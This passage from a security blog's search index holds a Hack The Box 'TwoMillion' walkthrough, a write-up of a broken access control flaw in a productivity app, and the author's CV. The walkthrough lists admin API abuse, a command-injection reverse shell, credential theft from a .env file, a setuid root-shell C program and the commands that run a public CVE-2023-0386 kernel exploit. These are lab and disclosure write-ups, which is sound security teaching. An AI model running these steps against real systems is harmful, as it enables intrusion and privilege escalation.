/ncv/i1/vaivgr/trarengr\u0026#34;,\u0026#34;enctype\u0026#34;:\u0026#34;ROT13\u0026#34;},\u0026#34;hint\u0026#34;:\u0026#34;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...\u0026#34;} We have converted the ROT13 string to cleartext format and it gave a hint for another endpoint.\nIn order to generate the invite code, make a POST request to /api/v1/invite/generate Upon sending a POST request for Generate-invite application returns a base64 encoded string.\n\u0026gt; curl -X POST http://2million.htb/api/v1/invite/generate {\u0026#34;0\u0026#34;:200,\u0026#34;success\u0026#34;:1,\u0026#34;data\u0026#34;:{\u0026#34;code\u0026#34;:\u0026#34;ME1FRzQtQlJTQzMtSEhZSkQtUzQ1UUQ=\u0026#34;,\u0026#34;format\u0026#34;:\u0026#34;encoded\u0026#34;}} We have converted the base64 encoded string to clear text format which gives us our invitation code.\n\u0026gt; echo \u0026#34;ME1FRzQtQlJTQzMtSEhZSkQtUzQ1UUQ=\u0026#34; | base64 -d 0MEG4-BRSC3-HHYJD-S45QD Registration Page We have entered our invitation code and which allows us to login into application with our username and password.\nUser Dashboard We have login into the application and we saw very limited options. A few of them are:\nDashboard FAQ Generate the VPN Connection File Available API Endpoints The interesting part of generating a VPN connection file was, It is called the api/v1/user/vpn/download. We can get the list of API endpoints by calling the /api/v1.\nIt was observed that the application contains the admin API as well. Admin API contains 3 endpoints:\nGET - /api/v1/admin/auth : Check if user is admin or not POST - /api/v1/admin/vpn/generate : Generate VPN for specific user PUT - /api/v1/admin/settings/update : Update user settings Check User Admin Right Status Update the User Rights Update admin settings API returns the error message which shows that the API request is missing an email parameter.\nWe have added the email parameter and sent the request. It\u0026rsquo;s observed that the API request is missing the \u0026ldquo;is_admin\u0026rdquo; parameter. We have added the missing parameter and based on the response it\u0026rsquo;s observed that the User has now admin privilege. Admin Access Check Generate VPN File Command Execution It\u0026rsquo;s observed that generated VPN profile endpoint is vulnerable to command Injection. Shell as www-data To get the reverse shell, we are using the netcat command.\nVolia 🥳 We got the connection back to our terminal.\nLet\u0026rsquo;s Upgrade the shell:\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; export TERM=xterm ctrl + z stty raw -echo; fg Get the User Flag Let\u0026rsquo;s cat the user flag…! Look like www-data user doesn\u0026rsquo;t have permission to view the file.\nwww-data@2million:/home/admin$ cat user.txt cat: user.txt: Permission denied List the Files, Directories and it\u0026rsquo;s permission:\nwww-data@2million:/home/admin$ ls -al total 32 drwxr-xr-x 4 admin admin 4096 Jun 6 2023 . drwxr-xr-x 3 root root 4096 Jun 6 2023 .. lrwxrwxrwx 1 root root 9 May 26 2023 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 admin admin 220 May 26 2023 .bash_logout -rw-r--r-- 1 admin admin 3771 May 26 2023 .bashrc drwx------ 2 admin admin 4096 Jun 6 2023 .cache -rw-r--r-- 1 admin admin 807 May 26 2023 .profile drwx------ 2 admin admin 4096 Jun 6 2023 .ssh -rw-r----- 1 root admin 33 Jan 18 12:03 user.txt Shell as admin We tried few ways to login as admin. From hint, we found that the .env file contains the DB username and password.\nwww-data@2million:~/html$ ls -al total 56 drwxr-xr-x 10 root root 4096 Jan 18 15:20 . drwxr-xr-x 3 root root 4096 Jun 6 2023 .. -rw-r--r-- 1 root root 87 Jun 2 2023 .env -rw-r--r-- 1 root root 1237 Jun 2 2023 Database.php -rw-r--r-- 1 root root 2787 Jun 2 2023 Router.php drwxr-xr-x 5 root root 4096 Jan 18 15:20 VPN drwxr-xr-x 2 root root 4096 Jun 6 2023 assets drwxr-xr-x 2 root root 4096 Jun 6 2023 controllers drwxr-xr-x 5 root root 4096 Jun 6 2023 css drwxr-xr-x 2 root root 4096 Jun 6 2023 fonts drwxr-xr-x 2 root root 4096 Jun 6 2023 images -rw-r--r-- 1 root root 2692 Jun 2 2023 index.php drwxr-xr-x 3 root root 4096 Jun 6 2023 js drwxr-xr-x 2 root root 4096 Jun 6 2023 views Environment Variables:\nwww-data@2million:~/html$ cat .env DB_HOST=127.0.0.1 DB_DATABASE=htb_prod DB_USERNAME=admin DB_PASSWORD=SuperDuperPass123 We have the env variable file which contains the username and password. Let\u0026rsquo;s try to open the /etc/passwd file and see if does admin user exists in the system or not. It looks like the admin user does exist on the system.\nShell as admin We can log in as admin users who read the user flag.\nNow, Let\u0026rsquo;s jump for root flag 🚩\nShell as root From the hint, we get to know that the admin user has to do something with the mail system on Linux. We got the admin file under the mail directory which contains the mail from ch4p regarding the Patching System OS.\nFrom: ch4p \u0026lt;ch4p@2million.htb\u0026gt; To: admin \u0026lt;admin@2million.htb\u0026gt; Cc: g0blin \u0026lt;g0blin@2million.htb\u0026gt; Subject: Urgent: Patch System OS Date: Tue, 1 June 2023 10:45:22 -0700 Message-ID: \u0026lt;9876543210@2million.htb\u0026gt; X-Mailer: ThunderMail Pro 5.2 Hey admin, I\u0026#39;m know you\u0026#39;re working as fast as you can to do the DB migration. While we\u0026#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can\u0026#39;t get popped by that. HTB Godfather Failed Attempt We searched OverlayFS CVE and came across this article by ProjectDiscovery.\nWe got the access as the root user but still, it\u0026rsquo;s not a complete root permission.\nCVE-2023-0386 Analysis I started searching again and it\u0026rsquo;s observed that the machine is vulnerable to CVE-2023-0386.\nFrom Google: CVE-2023-0386 is a high-severity vulnerability in the Linux kernel\u0026rsquo;s overlayfs filesystem. Improper permission handling allows local attackers to easily escalate privileges to root, compromising the entire system.\nHow to Detect? The easiest way to check whether your system is vulnerable is to see which version of the Linux kernel it uses by running the command uname -r\nA system is likely to be vulnerable if it has a kernel version lower than 6.2. We found that our Linux machine is running on 5.15\nadmin@2million:~$ uname -r 5.15.70-051570-generic Let\u0026rsquo;s understand what is SUID, OverlayFS…\nWhat is SUID bit? SUID, short for Set User ID, is a special permission that can be assigned to executable files. When an executable file has the SUID permission enabled, it allows users who execute the file to temporarily assume the privileges of the file\u0026rsquo;s owner.\nWhat is OverlayFS? Overlay filesystems, also known as “union filesystems” or “union mounts” let you mount a filesystem using 2 directories: a “lower” directory, and an “upper” directory.\n1. Structure OverlayFS uses three main components:\nLower directory: Read-only base layer containing the original files. Upper directory: Writable layer where changes are made. Merged view: The combined result of the lower and upper directories. 2. File Operations Read: If a file exists in both layers, the version in the upper layer is presented. If a file exists only in the lower layer, it is accessed from there. Write: If a file in the lower layer is modified, it is copied to the upper layer first (copy-on-write), and then the changes are applied to the copy. Delete: When a file in the lower layer is deleted, it is \u0026ldquo;hidden\u0026rdquo; by creating a whiteout marker in the upper layer. 3. Mounting Example Assume you have:\nLower layer: /lower Upper layer: /upper Mount point: /merged Command to create an overlay:\nmount -t overlay overlay -o lowerdir=/lower,upperdir=/upper,workdir=/work /merged How does the CVE-2023-0386 Works? Pretending to Have a Root-Owned File:\nThe attacker uses a trick called FUSE (a tool for making fake filesystems) to create a \u0026ldquo;fake\u0026rdquo; file that looks like: It\u0026rsquo;s owned by the system administrator (root). It has the SUID bit set, which means running this file will give whoever runs it admin-level privileges. Normally, creating such a file directly on the system isn’t allowed unless you\u0026rsquo;re already an admin. But with FUSE, you can fake it.\nCreate a Safe \u0026ldquo;Sandbox\u0026rdquo; Environment:\nThe attacker uses something called user namespaces to create a sandbox environment. This lets them temporarily do things (like mounting filesystems) that normally require admin permissions. Set Up the OverlayFS Trick:\nThe attacker sets up an OverlayFS filesystem: The lower directory (base layer) is the fake filesystem they made with FUSE. The upper directory (writable layer) is something like /tmp, where anyone can write files. Trigger the Kernel Bug:\nThe attacker \u0026ldquo;copies\u0026rdquo; the fake file (from the lower layer) to the writable layer (upper directory). When the kernel handles this copy, it believes the fake file’s permissions and creates a real file in /tmp that: Is owned by root. Has the SUID bit set. Escape the Sandbox and Exploit the File:\nThe attacker exits the sandbox and now has a real root-owned SUID file in /tmp. They execute this file to become root and take full control of the system. Code Example Here is the code example which I took from the Datadog article.\nThe code written in C will try to set setuid and setgid to root.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(void) { int result; result = setuid(0); if (result != 0 ) { printf(\u0026#34;could not setuid(0): %s\\n\u0026#34;, strerror(errno)); return result; } result = setgid(0); if (result != 0) { printf(\u0026#34;could not setguid(0): %s\\n\u0026#34;, strerror(errno)); return result; } printf(\u0026#34;Starting root shell...\\n\u0026#34;); system(\u0026#34;/bin/bash\u0026#34;); return 0; } Since, to set the uid or gid to root, User requires the root permission. As per expectations, We can see the Operation not permitted error from the code.\njohn@machine:~$ gcc -Wall setuid.c -o setuid john@machine:~$ chmod +x setuid john@machine:~$ ./setuid could not setuid(0): Operation not permitted Here, User has changed the file\u0026rsquo;s user and group ownership to root and also assigned the SUID to the file.\nroot@machine:/home/john$ chown root:root setuid root@machine:/home/john$ chmod +s setuid Here, Lower privilege user John executed the file and since setuid file contains the SUID permission, at the end of file execution John was able to get the Root Shell.\njohn@machine:~$ ./setuid Starting root shell... root@machine:~$ id uid=0(root) gid=0(root) groups=0(root),1002(john) Geting Root Flag I was using the POC for CVE-2023-0398 created by xkaneikiwhich is already available on Github.\nCommands:\nmake all ./fuse ./ovlcap/lower ./gc \u0026amp; ./exp We have the root flag.\nWe also have thank you message from HTB team. Let\u0026rsquo;s try to read the message.\nThank You Message from HTB Team Final Thank You Message Dear HackTheBox Community, We are thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you. From the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community. To each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come. Here\u0026#39;s to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all. With deepest gratitude, The HackTheBox Team References https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/ https://github.com/xkaneiki/CVE-2023-0386 https://0xdf.gitlab.io/2023/06/07/htb-twomillion.html https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/ Connect with Me LinkedIn Twitter GitHub Hack The Box ","permalink":"https://bhavik-kanejiya.github.io/blog/htb-twomillion-walkthrough/","summary":"Explore an in-depth walkthrough of the HTB Cap machine, focusing on network packet analysis and leveraging captured data for exploitation. Follow each step from initial reconnaissance to achieving root access, emphasizing practical network security techniques","title":"HTB TwoMillion Walkthrough"},{"content":"\nDiscover a broken access control vulnerability in a popular productivity app with over 2 million users. This post details how an employee gained limited admin privileges by manipulating the API\u0026rsquo;s workspace ID, including steps to reproduce the exploit.\nApplication Overview It’s a productivity app that has over 2 million+ users and is used by business to track employee project time and expenses.\nKey Features There are many features, but these are some of the most important ones:\nUser can join multiple workspaces User can create their own workspace The admin of a workspace can invite other user by email How does the application work? A user can join multiple workspaces from one account, but the user ID will be the same across all the workspace. So, the user create personal workspace and along with company\u0026rsquo;s workspace\nThe API uses the workspace ID to interact with the application.\nThis is what the request look a like: This is how Workspace ID look a like: While the test for role-based broken access control, uses multi-account containers where cookies are separated by container, allowing us to use the web with multiple accounts.\nWhile the test for role-based broken access control, Use PwnFox to colorize the tab and burpsuite proxy history.\nThere are a few sections that are only visible to the admin. On the user side, we have limited functionalities. If we change the workspace ID directly, it will redirect me to its homepage. We use burp’s match and replace feature to replace the Workspace ID.\nThis is the final result when the user successfully matches and replaces the personal workspace ID with the company’s workspace ID.\nStep to Reproduce End Note If you have enjoyed this article, Share this with your friends. Thank you! https://linktr.ee/bhavikkanejiya\nReferences Automating IDORs with Autorize - Common API Bugs Pt. 2 - IDORs \u0026amp; Access Control Issues by @Asseem_shrey PimpMyBurp #1 – PwnFox + Autorize Burp Suite tutorial: IDOR vulnerability automation using Autorize and AutoRepeater Two account takeover bugs worth $$$$ ","permalink":"https://bhavik-kanejiya.github.io/blog/lets-peek-inside-the-admin-dashboard/","summary":"Discover a broken access control vulnerability in a popular productivity app with over 2 million users. This post details how an employee gained limited admin privileges by manipulating the API\u0026rsquo;s workspace ID, including steps to reproduce the exploit.","title":"Let’s do a peek inside the admin dashboard - Abuse API endpoint"},{"content":"Bhavik Kanejiya Associate Consultant | Cybersecurity Enthusiast | Pentester\n📍 Bangalore, India | 📧 caesorx@duck.com | 🔗 LinkedIn | 🧑‍💻 GitHub\nProfessional Summary Penetration testing and network security specialist with 2 years of experience securing web applications, APIs, mobile apps, Kubernetes, and cloud environments. Identified and mitigated multiple critical vulnerabilities, reducing risk by 60%. Skilled at integrating security into development lifecycles to deliver robust solutions and foster innovation. Proven collaborator in cross-functional teams, driving secure and scalable outcomes.\nProfessional Skills Technical Web, API, Mobile (Android \u0026amp; iOS), Thick Client, Phishing, AWS, Kubernetes, Docker, Python, Bash, Linux, Windows Tools Burp Suite, OWASP ZAP, Nmap, Nessus, Postman, Wireshark, IBM AppScan Work Experience Associate Consultant @KPMG India | April 2025 – Present\nAnalyst @KPMG India | June 2023 – March 2025\nPenetration Tester Intern @HackersEra | Nov 2022 – May 2023\nCertifications \u0026amp; Training AZ-900 – Microsoft Azure Fundamentals (12/2024) - View Credential AWS Certified Cloud Practitioner (12/2023) - Verify Credential Certified Mobile Pentester (CMPen) – Android, The SecOps Group (09/2023) The Kubernetes Crusade: Defending \u0026amp; Attacking Kubernetes, Nullcon (05/2024) Presentations Attacking and Defending Kubernetes - Presented at Null Bangalore\nDelivered a session on Kubernetes architecture, vulnerabilities, and defense strategies (150+ attendees). Education BCA – Computer Science, Shri Shambhubhai V. Patel College of C.S. \u0026amp; B.M., Surat, Gujarat\nApril 2022\nLast Updated: June 2025\n","permalink":"https://bhavik-kanejiya.github.io/about/","summary":"About Me","title":"About Me"}]